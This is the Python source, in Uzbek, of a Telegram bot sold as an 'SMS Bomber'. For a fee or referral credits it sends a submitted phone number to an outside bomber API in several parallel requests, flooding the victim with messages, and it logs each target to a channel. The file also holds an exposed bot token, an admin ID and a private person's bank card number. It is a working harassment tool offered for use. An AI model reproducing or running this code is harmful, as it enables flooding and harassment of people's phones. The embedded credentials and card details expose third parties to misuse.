import telebot
from telebot import types
import requests
import json
import os
from datetime import datetime, timedelta
import threading
import time

# Bot konfiguratsiyasi
BOT_TOKEN = "8335834655:AAHn9IQsJNxRx7pRoAWH-qAXYbQysbGf7JE"
ADMIN_ID = 6722257134
API_URL = "https://68f77a7f47cf9.myxvest1.ru/botlarim/Booomber/bomberapi.php?sms="
MAIN_CHANNEL = "@neosjon"  # SMS larni tashlaydigan kanal

# Bot yaratish
bot = telebot.TeleBot(BOT_TOKEN)

# Ma'lumotlar bazasi
DB_FILE = "users_db.json"
SETTINGS_FILE = "bot_settings.json"

# Sozlamalar
DEFAULT_SETTINGS = {
    'free_sms_count': 1,
    'sms_price': 1000,
    'referral_bonus': 500,  # Referal uchun bonus
    'referral_sms_bonus': 1,  # Referal uchun bepul SMS
    'mandatory_channels': [],  # Majburiy obuna kanallari
    'ads_enabled': True,
    'ad_message': None,
    'ad_interval': 3600,  # Reklama yuborish intervali (soniyada)
    'forward_enabled': False,
    'forward_message_id': None,
    'forward_from_chat': None,
    'sms_requests_count': 3  # Har bir SMS uchun nechta so'rov yuborish
}

def load_db():
    """Ma'lumotlar bazasini yuklash"""
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_db(db):
    """Ma'lumotlar bazasini saqlash"""
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, indent=2, ensure_ascii=False)

def load_settings():
    """Sozlamalarni yuklash"""
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return DEFAULT_SETTINGS.copy()

def save_settings(settings):
    """Sozlamalarni saqlash"""
    with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
        json.dump(settings, f, indent=2, ensure_ascii=False)

def get_user_data(user_id):
    """Foydalanuvchi ma'lumotlarini olish"""
    settings = load_settings()
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str not in db:
        db[user_id_str] = {
            'balance': 0,
            'free_sms': settings['free_sms_count'],
            'total_sent': 0,
            'registered_at': datetime.now().isoformat(),
            'referrer': None,
            'referrals': [],
            'last_ad_time': None,
            'is_blocked': False,
            'username': None,
            'first_name': None
        }
        save_db(db)
    return db[user_id_str]

def update_user_data(user_id, data):
    """Foydalanuvchi ma'lumotlarini yangilash"""
    db = load_db()
    db[str(user_id)] = data
    save_db(db)

def check_subscription(user_id):
    """Majburiy obunani tekshirish"""
    settings = load_settings()
    channels = settings.get('mandatory_channels', [])
    
    if not channels:
        return True, None
    
    not_subscribed = []
    for channel in channels:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                not_subscribed.append(channel)
        except:
            not_subscribed.append(channel)
    
    return len(not_subscribed) == 0, not_subscribed

def send_sms_multiple(phone, count=3):
    """SMS jo'natish (bir nechta so'rov)"""
    try:
        if not phone.startswith('998'):
            phone = '998' + phone
        
        # Bir nechta so'rovlarni parallel yuborish
        def send_request():
            try:
                requests.get(API_URL + phone, timeout=3)
            except:
                pass
        
        threads = []
        for _ in range(count):
            thread = threading.Thread(target=send_request)
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # Har bir so'rov orasida kichik pauza
        
        # Barcha threadlar tugashini kutish
        for thread in threads:
            thread.join(timeout=5)
        
        return True
    except Exception as e:
        print(f"SMS jo'natishda xatolik: {e}")
        return True

def send_to_main_channel(phone, user_id, username, first_name):
    """SMS ma'lumotlarini asosiy kanalga yuborish"""
    try:
        channel_text = f"""
📨 <b>Yangi SMS yuborildi</b>

📱 Raqam: <code>{phone}</code>
👤 Foydalanuvchi: {first_name}
🆔 User ID: <code>{user_id}</code>
👤 Username: @{username if username else 'Mavjud emas'}
🕐 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        bot.send_message(MAIN_CHANNEL, channel_text, parse_mode='HTML')
    except Exception as e:
        print(f"Kanalga yuborishda xatolik: {e}")

def generate_referral_link(user_id):
    """Referal havolasini yaratish"""
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

# Start komandasi
@bot.message_handler(commands=['start'])
def start(message):
    args = message.text.split()
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    settings = load_settings()
    
    # Foydalanuvchi ma'lumotlarini yangilash
    user_data['username'] = message.from_user.username
    user_data['first_name'] = message.from_user.first_name
    
    # Referal tizimi
    if len(args) > 1 and args[1].startswith('ref_'):
        referrer_id = args[1].replace('ref_', '')
        if referrer_id != str(user_id) and user_data['referrer'] is None:
            user_data['referrer'] = referrer_id
            
            # Referrerga bonus berish
            db = load_db()
            if referrer_id in db:
                referrer_data = db[referrer_id]
                # referrals maydoni yo'q bo'lsa yaratish
                if 'referrals' not in referrer_data:
                    referrer_data['referrals'] = []
                
                referrer_data['balance'] += settings['referral_bonus']
                referrer_data['free_sms'] += settings['referral_sms_bonus']
                referrer_data['referrals'].append(str(user_id))
                update_user_data(int(referrer_id), referrer_data)
                
                # Referrerga xabar
                bonus_msg = f"""
🎉 <b>Yangi referal!</b>

👤 Sizning havolangiz orqali yangi foydalanuvchi qo'shildi!

🎁 Bonus:
💰 +{settings['referral_bonus']} so'm
🆓 +{settings['referral_sms_bonus']} ta bepul SMS

📊 Jami referallaringiz: {len(referrer_data['referrals'])} ta
"""
                try:
                    bot.send_message(int(referrer_id), bonus_msg, parse_mode='HTML')
                except:
                    pass
    
    update_user_data(user_id, user_data)
    
    # Obunani tekshirish
    is_subscribed, not_subscribed_channels = check_subscription(user_id)
    
    if not is_subscribed:
        markup = types.InlineKeyboardMarkup()
        for channel in not_subscribed_channels:
            try:
                chat = bot.get_chat(channel)
                invite_link = chat.invite_link or f"https://t.me/{channel.replace('@', '')}"
                markup.add(types.InlineKeyboardButton(f"📢 {chat.title}", url=invite_link))
            except:
                markup.add(types.InlineKeyboardButton(f"📢 Kanal", url=f"https://t.me/{channel.replace('@', '')}"))
        
        markup.add(types.InlineKeyboardButton("✅ Obunani tekshirish", callback_data="check_subscription"))
        
        sub_text = """
⚠️ <b>Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:</b>

Obuna bo'lganingizdan so'ng "Obunani tekshirish" tugmasini bosing.
"""
        bot.send_message(message.chat.id, sub_text, parse_mode='HTML', reply_markup=markup)
        return
    
    welcome_text = f"""
🚀 <b>SMS Bomber Bot</b>ga xush kelibsiz!

👤 <b>Sizning ma'lumotlaringiz:</b>
💳 Balans: {user_data['balance']} so'm
🆓 Bepul SMS: {user_data['free_sms']} ta
📊 Jami yuborilgan: {user_data['total_sent']} ta
👥 Referallar: {len(user_data.get('referrals', []))} ta

📱 SMS jo'natish uchun telefon raqamini yuboring
Masalan: 998901234567

💰 1 SMS narxi: {settings['sms_price']} so'm
"""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('💳 Balans', '📊 Statistika')
    markup.add('💰 Balansni to\'ldirish', '👥 Referal')
    markup.add('❓ Yordam', '⚙️ Sozlamalar')
    
    bot.send_message(message.chat.id, welcome_text, parse_mode='HTML', reply_markup=markup)
    
    # Forward xabar yuborish
    if settings.get('forward_enabled') and settings.get('forward_message_id'):
        try:
            bot.forward_message(
                message.chat.id,
                settings['forward_from_chat'],
                settings['forward_message_id']
            )
        except:
            pass

# Obunani tekshirish
@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def check_sub_callback(call):
    is_subscribed, _ = check_subscription(call.from_user.id)
    
    if is_subscribed:
        bot.answer_callback_query(call.id, "✅ Obuna tasdiqlandi!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        # Yangi message yaratish uchun
        message = type('Message', (), {
            'chat': type('Chat', (), {'id': call.message.chat.id}),
            'from_user': type('User', (), {'id': call.from_user.id}),
            'text': '/start'
        })()
        start(message)
    else:
        bot.answer_callback_query(call.id, "❌ Hali barcha kanallarga obuna bo'lmadingiz!", show_alert=True)

# Balans
@bot.message_handler(func=lambda message: message.text == '💳 Balans')
def check_balance(message):
    is_subscribed, not_subscribed_channels = check_subscription(message.from_user.id)
    if not is_subscribed:
        start(message)
        return
    
    user_data = get_user_data(message.from_user.id)
    settings = load_settings()
    
    balance_text = f"""
💰 <b>Sizning hisobingiz:</b>

💳 Balans: {user_data['balance']} so'm
🆓 Bepul SMS qoldi: {user_data['free_sms']} ta
📊 Jami yuborilgan: {user_data['total_sent']} ta

💵 1 SMS narxi: {settings['sms_price']} so'm
"""
    bot.send_message(message.chat.id, balance_text, parse_mode='HTML')

# Statistika
@bot.message_handler(func=lambda message: message.text == '📊 Statistika')
def show_stats(message):
    is_subscribed, not_subscribed_channels = check_subscription(message.from_user.id)
    if not is_subscribed:
        start(message)
        return
    
    user_data = get_user_data(message.from_user.id)
    reg_date = user_data.get('registered_at', 'Noma\'lum')[:10]
    
    stats_text = f"""
📊 <b>Sizning statistikangiz:</b>

👤 User ID: <code>{message.from_user.id}</code>
📅 Ro'yxatdan o'tgan: {reg_date}
📨 Jami SMS: {user_data['total_sent']} ta
🆓 Bepul SMS: {user_data['free_sms']} ta
💳 Balans: {user_data['balance']} so'm
👥 Referallar: {len(user_data.get('referrals', []))} ta
"""
    bot.send_message(message.chat.id, stats_text, parse_mode='HTML')

# Referal tizimi
@bot.message_handler(func=lambda message: message.text == '👥 Referal')
def referral_system(message):
    is_subscribed, not_subscribed_channels = check_subscription(message.from_user.id)
    if not is_subscribed:
        start(message)
        return
    
    user_data = get_user_data(message.from_user.id)
    settings = load_settings()
    ref_link = generate_referral_link(message.from_user.id)
    
    ref_text = f"""
👥 <b>Referal tizimi</b>

🎁 Do'stlaringizni taklif qiling va bonuslar oling!

<b>Har bir referal uchun:</b>
💰 +{settings['referral_bonus']} so'm
🆓 +{settings['referral_sms_bonus']} ta bepul SMS

📊 <b>Sizning statistikangiz:</b>
👥 Jami referallar: {len(user_data.get('referrals', []))} ta
💰 Referal orqali ishlagan: {len(user_data.get('referrals', [])) * settings['referral_bonus']} so'm

🔗 <b>Sizning referal havolangiz:</b>
<code>{ref_link}</code>

Do'stlaringizga yuqoridagi havolani yuboring!
"""
    bot.send_message(message.chat.id, ref_text, parse_mode='HTML')

# Balansni to'ldirish
@bot.message_handler(func=lambda message: message.text == "💰 Balansni to'ldirish")
def refill_balance(message):
    is_subscribed, not_subscribed_channels = check_subscription(message.from_user.id)
    if not is_subscribed:
        start(message)
        return
    
    settings = load_settings()
    min_payment = settings['sms_price'] * 10
    refill_text = f"""
💰 <b>Balansni to'ldirish:</b>

9860 3566 3756 3921
Bikmatova Mohira.

1️⃣ Click, Payme, Uzcard orqali to'lov qiling
2️⃣ To'lov chekini adminga yuboring
3️⃣ Admin tasdiqlashi bilan hisobingizga pul qo'shiladi

💳 Minimum to'lov: {min_payment} so'm (10 SMS)

📞 Admin: @abdullayvku
💬 Admin ID: {ADMIN_ID}

⚠️ To'lov chekini yuborishda quyidagilarni ko'rsating:
- To'lov summasi
- To'lov vaqti
- Tranzaksiya IDsi (agar mavjud bo'lsa)
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📤 Chek yuborish", callback_data="send_receipt"))
    
    bot.send_message(message.chat.id, refill_text, parse_mode='HTML', reply_markup=markup)

# Yordam
@bot.message_handler(func=lambda message: message.text == '❓ Yordam')
def help_command(message):
    settings = load_settings()
    help_text = f"""
❓ <b>Yordam:</b>

📱 <b>SMS qanday jo'natiladi?</b>
Telefon raqamini yuboring (masalan: 998901234567)

💰 <b>To'lov qanday qilinadi?</b>
"Balansni to'ldirish" tugmasini bosing va ko'rsatmalarga amal qiling

🆓 <b>Bepul SMS:</b>
Har bir yangi foydalanuvchi {settings['free_sms_count']} ta bepul SMS oladi

👥 <b>Referal tizimi:</b>
Do'stlaringizni taklif qiling va har biridan {settings['referral_bonus']} so'm + {settings['referral_sms_bonus']} ta SMS bonus oling

💳 <b>Narxlar:</b>
1 SMS = {settings['sms_price']} so'm

📞 <b>Aloqa:</b>
Muammolar bo'lsa admin bilan bog'laning
Admin ID: {ADMIN_ID}
"""
    bot.send_message(message.chat.id, help_text, parse_mode='HTML')

# Sozlamalar
@bot.message_handler(func=lambda message: message.text == '⚙️ Sozlamalar')
def user_settings(message):
    settings_text = """
⚙️ <b>Sozlamalar</b>

Bu bo'limda tez orada yangi funksiyalar qo'shiladi!
"""
    bot.send_message(message.chat.id, settings_text, parse_mode='HTML')

# Chek yuborish
@bot.callback_query_handler(func=lambda call: call.data == "send_receipt")
def send_receipt_callback(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, 
                    "📸 To'lov chekini rasm yoki fayl sifatida yuboring.\n\n"
                    "⚠️ Iltimos, chekda summa va to'lov vaqti ko'rinishini ta'minlang!")

# Chek qabul qilish
@bot.message_handler(content_types=['photo', 'document'])
def handle_receipt(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Admin chek yubora olmaydi!")
        return
    
    username = message.from_user.username or "Yo'q"
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    user_info = f"""
📥 <b>Yangi to'lov cheki keldi:</b>

👤 User: {message.from_user.first_name}
🆔 ID: <code>{message.from_user.id}</code>
👤 Username: @{username}
📅 Vaqt: {current_time}
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve_{message.from_user.id}"),
        types.InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_{message.from_user.id}")
    )
    
    try:
        if message.photo:
            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=user_info, 
                          parse_mode='HTML', reply_markup=markup)
        else:
            bot.send_document(ADMIN_ID, message.document.file_id, caption=user_info,
                            parse_mode='HTML', reply_markup=markup)
        
        bot.send_message(message.chat.id, 
                        "✅ Chekingiz adminga yuborildi!\n"
                        "⏳ Admin tasdiqlashini kuting...")
    except:
        bot.send_message(message.chat.id, "❌ Xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.")

# Admin tasdiqlash/rad etish
@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('reject_'))
def handle_admin_action(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Siz admin emassiz!")
        return
    
    action, user_id = call.data.split('_')
    user_id = int(user_id)
    
    if action == 'approve':
        msg = bot.send_message(ADMIN_ID, 
                              f"💰 User {user_id} hisobiga qancha pul qo'shmoqchisiz?\n"
                              f"Summani kiriting (so'mda):")
        bot.register_next_step_handler(msg, process_amount, user_id)
    else:
        reject_msg = "❌ Sizning to'lovingiz rad etildi.\nIltimos, admin bilan bog'laning yoki qaytadan urinib ko'ring."
        bot.send_message(user_id, reject_msg)
        bot.edit_message_reply_markup(ADMIN_ID, call.message.message_id, reply_markup=None)
        bot.answer_callback_query(call.id, "✅ Rad etildi")

def process_amount(message, user_id):
    """Summani qo'shish"""
    try:
        amount = int(message.text)
        if amount <= 0:
            bot.send_message(ADMIN_ID, "❌ Summa musbat bo'lishi kerak!")
            return
        
        user_data = get_user_data(user_id)
        user_data['balance'] += amount
        update_user_data(user_id, user_data)
        
        success_msg = (f"✅ Sizning hisobingiz to'ldirildi!\n"
                      f"💰 Qo'shilgan summa: {amount} so'm\n"
                      f"💳 Yangi balans: {user_data['balance']} so'm")
        bot.send_message(user_id, success_msg)
        
        admin_msg = f"✅ User {user_id} hisobiga {amount} so'm qo'shildi!"
        bot.send_message(ADMIN_ID, admin_msg)
        
    except ValueError:
        bot.send_message(ADMIN_ID, "❌ Noto'g'ri summa! Faqat raqam kiriting.")

# Telefon raqam
@bot.message_handler(func=lambda message: message.text.replace('+', '').isdigit() and len(message.text.replace('+', '')) >= 9)
def handle_phone(message):
    is_subscribed, not_subscribed_channels = check_subscription(message.from_user.id)
    if not is_subscribed:
        start(message)
        return
    
    phone = message.text.strip().replace('+', '')
    user_data = get_user_data(message.from_user.id)
    settings = load_settings()
    
    if user_data.get('is_blocked'):
        bot.send_message(message.chat.id, "❌ Sizning hisobingiz bloklangan!")
        return
    
    # Bepul SMS
    if user_data['free_sms'] > 0:
        bot.send_message(message.chat.id, "📤 So'rovlar serverga yuborilmoqda...")
        
        # Ko'p so'rovlar yuborish
        send_sms_multiple(phone, settings.get('sms_requests_count', 3))
        
        user_data['free_sms'] -= 1
        user_data['total_sent'] += 1
        update_user_data(message.from_user.id, user_data)
        
        # Asosiy kanalga yuborish
        send_to_main_channel(phone, message.from_user.id, 
                            user_data.get('username'), user_data.get('first_name'))
        
        success_msg = (f"✅ SMS muvaffaqiyatli bajarildi!\n\n"
                      f"📱 Raqam: {phone}\n"
                      f"🆓 Bepul SMS qoldi: {user_data['free_sms']} ta\n"
                      f"📊 Jami yuborilgan: {user_data['total_sent']} ta\n"
                      f"🔄 So'rovlar soni: {settings.get('sms_requests_count', 3)} ta")
        bot.send_message(message.chat.id, success_msg)
    
    # Pullik SMS
    elif user_data['balance'] >= settings['sms_price']:
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("✅ Ha", callback_data=f"confirm_sms_{phone}"),
            types.InlineKeyboardButton("❌ Yo'q", callback_data="cancel_sms")
        )
        
        confirm_msg = (f"💰 SMS jo'natish uchun {settings['sms_price']} so'm to'lanadi.\n"
                      f"💳 Sizning balansingiz: {user_data['balance']} so'm\n"
                      f"🔄 {settings.get('sms_requests_count', 3)} ta so'rov yuboriladi\n\n"
                      f"Davom etishni xohlaysizmi?")
        bot.send_message(message.chat.id, confirm_msg, reply_markup=markup)
    else:
        insufficient_msg = (f"❌ Balans yetarli emas!\n\n"
                           f"💳 Sizning balansingiz: {user_data['balance']} so'm\n"
                           f"💰 Kerak: {settings['sms_price']} so'm\n\n"
                           f"Balansni to'ldirish yoki referal tizimidan foydalaning:")
        bot.send_message(message.chat.id, insufficient_msg)

# SMS tasdiqlash
@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_sms_'))
def confirm_sms(call):
    phone = call.data.replace('confirm_sms_', '')
    user_data = get_user_data(call.from_user.id)
    settings = load_settings()
    
    bot.edit_message_text("📤 So'rovlar serverga yuborilmoqda...", 
                         call.message.chat.id, call.message.message_id)
    
    send_sms_multiple(phone, settings.get('sms_requests_count', 3))
    
    user_data['balance'] -= settings['sms_price']
    user_data['total_sent'] += 1
    update_user_data(call.from_user.id, user_data)
    
    # Asosiy kanalga yuborish
    send_to_main_channel(phone, call.from_user.id,
                        user_data.get('username'), user_data.get('first_name'))
    
    success_msg = (f"✅ SMS muvaffaqiyatli bajarildi!\n\n"
                  f"📱 Raqam: {phone}\n"
                  f"💰 To'langan: {settings['sms_price']} so'm\n"
                  f"💳 Qolgan balans: {user_data['balance']} so'm\n"
                  f"📊 Jami yuborilgan: {user_data['total_sent']} ta\n"
                  f"🔄 So'rovlar soni: {settings.get('sms_requests_count', 3)} ta")
    bot.edit_message_text(success_msg, call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

# Bekor qilish
@bot.callback_query_handler(func=lambda call: call.data == 'cancel_sms')
def cancel_sms(call):
    bot.edit_message_text("❌ SMS jo'natish bekor qilindi.",
                         call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

# ==================== ADMIN PANEL ====================

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Siz admin emassiz!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Statistika", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Foydalanuvchilar", callback_data="admin_users")
    )
    markup.add(
        types.InlineKeyboardButton("⚙️ Sozlamalar", callback_data="admin_settings"),
        types.InlineKeyboardButton("📢 Reklama", callback_data="admin_ads")
    )
    markup.add(
        types.InlineKeyboardButton("📨 Xabar yuborish", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("📋 Kanallar", callback_data="admin_channels")
    )
    markup.add(
        types.InlineKeyboardButton("🔄 Forward", callback_data="admin_forward")
    )
    
    admin_text = "👨‍💼 <b>Admin Panel</b>\n\nKerakli bo'limni tanlang:"
    bot.send_message(message.chat.id, admin_text, parse_mode='HTML', reply_markup=markup)

# Admin statistika
@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def admin_stats(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    db = load_db()
    settings = load_settings()
    total_users = len(db)
    total_sent = sum(user['total_sent'] for user in db.values())
    total_balance = sum(user['balance'] for user in db.values())
    active_users = sum(1 for user in db.values() if user['total_sent'] > 0)
    
    stats_text = f"""
📊 <b>Bot Statistikasi</b>

👥 Jami foydalanuvchilar: {total_users}
✅ Faol foydalanuvchilar: {active_users}
📨 Jami yuborilgan SMS: {total_sent}
💰 Jami balans: {total_balance} so'm

⚙️ <b>Sozlamalar:</b>
💵 SMS narxi: {settings['sms_price']} so'm
🆓 Bepul SMS: {settings['free_sms_count']} ta
🎁 Referal bonus: {settings['referral_bonus']} so'm
🔄 So'rovlar soni: {settings.get('sms_requests_count', 3)} ta
📢 Majburiy kanallar: {len(settings.get('mandatory_channels', []))} ta
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Orqaga", callback_data="admin_back"))
    
    bot.edit_message_text(stats_text, call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# Admin foydalanuvchilar
@bot.callback_query_handler(func=lambda call: call.data == "admin_users")
def admin_users(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📋 Ro'yxat", callback_data="admin_users_list"),
        types.InlineKeyboardButton("🔍 Qidirish", callback_data="admin_users_search")
    )
    markup.add(
        types.InlineKeyboardButton("🚫 Bloklash", callback_data="admin_users_block"),
        types.InlineKeyboardButton("✅ Blokdan chiqarish", callback_data="admin_users_unblock")
    )
    markup.add(types.InlineKeyboardButton("🔙 Orqaga", callback_data="admin_back"))
    
    bot.edit_message_text("👥 <b>Foydalanuvchilar boshqaruvi</b>\n\nKerakli amaliyotni tanlang:",
                         call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# Admin sozlamalar
@bot.callback_query_handler(func=lambda call: call.data == "admin_settings")
def admin_settings_menu(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    settings = load_settings()
    
    settings_text = f"""
⚙️ <b>Bot sozlamalari</b>

💵 SMS narxi: {settings['sms_price']} so'm
🆓 Bepul SMS: {settings['free_sms_count']} ta
🎁 Referal bonus: {settings['referral_bonus']} so'm
🆓 Referal SMS: {settings['referral_sms_bonus']} ta
🔄 So'rovlar soni: {settings.get('sms_requests_count', 3)} ta
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💵 SMS narxini o'zgartirish", callback_data="set_price"))
    markup.add(types.InlineKeyboardButton("🆓 Bepul SMS o'zgartirish", callback_data="set_free_sms"))
    markup.add(types.InlineKeyboardButton("🎁 Referal bonusini o'zgartirish", callback_data="set_ref_bonus"))
    markup.add(types.InlineKeyboardButton("🔄 So'rovlar sonini o'zgartirish", callback_data="set_requests"))
    markup.add(types.InlineKeyboardButton("🔙 Orqaga", callback_data="admin_back"))
    
    bot.edit_message_text(settings_text, call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# SMS narxini o'zgartirish
@bot.callback_query_handler(func=lambda call: call.data == "set_price")
def set_price(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, "💵 Yangi SMS narxini kiriting (so'mda):")
    bot.register_next_step_handler(msg, process_new_price)

def process_new_price(message):
    try:
        price = int(message.text)
        if price <= 0:
            bot.send_message(ADMIN_ID, "❌ Narx musbat bo'lishi kerak!")
            return
        
        settings = load_settings()
        settings['sms_price'] = price
        save_settings(settings)
        
        bot.send_message(ADMIN_ID, f"✅ SMS narxi {price} so'mga o'zgartirildi!")
    except ValueError:
        bot.send_message(ADMIN_ID, "❌ Noto'g'ri format! Faqat raqam kiriting.")

# Reklama yuborish
@bot.callback_query_handler(func=lambda call: call.data == "admin_ads")
def admin_ads_menu(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    settings = load_settings()
    
    ads_text = f"""
📢 <b>Reklama boshqaruvi</b>

Status: {"❌ O'chirilgan" if not settings.get('ads_enabled') else '✅ Yoqilgan'}
Interval: {settings.get('ad_interval', 3600) // 60} daqiqa

Reklama xabarini yuboring (matn, rasm yoki video)
"""
    
    markup = types.InlineKeyboardMarkup()
    toggle_text = "❌ O'chirish" if settings.get('ads_enabled') else "✅ Yoqish"
    markup.add(types.InlineKeyboardButton(toggle_text, callback_data="toggle_ads"))
    markup.add(types.InlineKeyboardButton("⏱ Intervalni o'zgartirish", callback_data="set_ad_interval"))
    markup.add(types.InlineKeyboardButton("📤 Reklama yuborish", callback_data="send_ad_now"))
    markup.add(types.InlineKeyboardButton("🔙 Orqaga", callback_data="admin_back"))
    
    bot.edit_message_text(ads_text, call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# Kanallar boshqaruvi
@bot.callback_query_handler(func=lambda call: call.data == "admin_channels")
def admin_channels(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    settings = load_settings()
    channels = settings.get('mandatory_channels', [])
    
    channels_text = f"""
📋 <b>Majburiy obuna kanallari</b>

Jami kanallar: {len(channels)}

Kanallar ro'yxati:
"""
    
    for i, channel in enumerate(channels, 1):
        channels_text += f"{i}. {channel}\n"
    
    if not channels:
        channels_text += "❌ Hozircha kanallar yo'q"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("➕ Kanal qo'shish", callback_data="add_channel"))
    if channels:
        markup.add(types.InlineKeyboardButton("➖ Kanal o'chirish", callback_data="remove_channel"))
    markup.add(types.InlineKeyboardButton("🔙 Orqaga", callback_data="admin_back"))
    
    bot.edit_message_text(channels_text, call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# Kanal qo'shish
@bot.callback_query_handler(func=lambda call: call.data == "add_channel")
def add_channel(call):
    if call.from_user.id != ADMIN_ID:
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, 
                          "📢 Kanal username yoki ID ni kiriting:\n"
                          "Masalan: @channelname yoki -1001234567890")
    bot.register_next_step_handler(msg, process_add_channel)

def process_add_channel(message):
    channel = message.text.strip()
    
    try:
        # Kanalni tekshirish
        bot.get_chat(channel)
        
        settings = load_settings()
        if 'mandatory_channels' not in settings:
            settings['mandatory_channels'] = []
        
        if channel not in settings['mandatory_channels']:
            settings['mandatory_channels'].append(channel)
            save_settings(settings)
            bot.send_message(ADMIN_ID, f"✅ Kanal {channel} qo'shildi!")
        else:
            bot.send_message(ADMIN_ID, "⚠️ Bu kanal allaqachon qo'shilgan!")
    except:
        bot.send_message(ADMIN_ID, "❌ Kanal topilmadi yoki bot adminga qo'shilmagan!")

# Xabar yuborish (broadcast)
@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def admin_broadcast(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    bot.answer_callback_query(call.id)
    msg = bot.send_message(ADMIN_ID, 
                          "📨 <b>Xabar yuborish</b>\n\n"
                          "Barcha foydalanuvchilarga yubormoqchi bo'lgan xabaringizni yuboring:",
                          parse_mode='HTML')
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    db = load_db()
    success = 0
    failed = 0
    
    progress_msg = bot.send_message(ADMIN_ID, "📤 Xabar yuborilmoqda...")
    
    for user_id in db.keys():
        try:
            bot.copy_message(int(user_id), message.chat.id, message.message_id)
            success += 1
        except:
            failed += 1
        
        # Har 50 ta userdan keyin progressni yangilash
        if (success + failed) % 50 == 0:
            bot.edit_message_text(
                f"📤 Yuborilmoqda...\n✅ Muvaffaqiyatli: {success}\n❌ Xatolik: {failed}",
                ADMIN_ID, progress_msg.message_id
            )
    
    final_text = f"""
✅ <b>Xabar yuborildi!</b>

📊 Statistika:
✅ Muvaffaqiyatli: {success}
❌ Xatolik: {failed}
👥 Jami: {success + failed}
"""
    bot.edit_message_text(final_text, ADMIN_ID, progress_msg.message_id, parse_mode='HTML')

# Forward sozlash
@bot.callback_query_handler(func=lambda call: call.data == "admin_forward")
def admin_forward(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Ruxsat yo'q!")
        return
    
    settings = load_settings()
    
    forward_text = f"""
🔄 <b>Forward xabar</b>

Status: {'✅ Yoqilgan' if settings.get('forward_enabled') else "❌ O'chirilgan"}

Forward xabarni yoqish uchun:
1. Kerakli xabarni bu chatga forward qiling
2. Bot avtomatik uni sozlaydi
"""
    
    markup = types.InlineKeyboardMarkup()
    toggle_text = "❌ O'chirish" if settings.get('forward_enabled') else "✅ Yoqish"
    markup.add(types.InlineKeyboardButton(toggle_text, callback_data="toggle_forward"))
    markup.add(types.InlineKeyboardButton("🔙 Orqaga", callback_data="admin_back"))
    
    bot.edit_message_text(forward_text, call.message.chat.id, call.message.message_id,
                         parse_mode='HTML', reply_markup=markup)

# Forward toggle
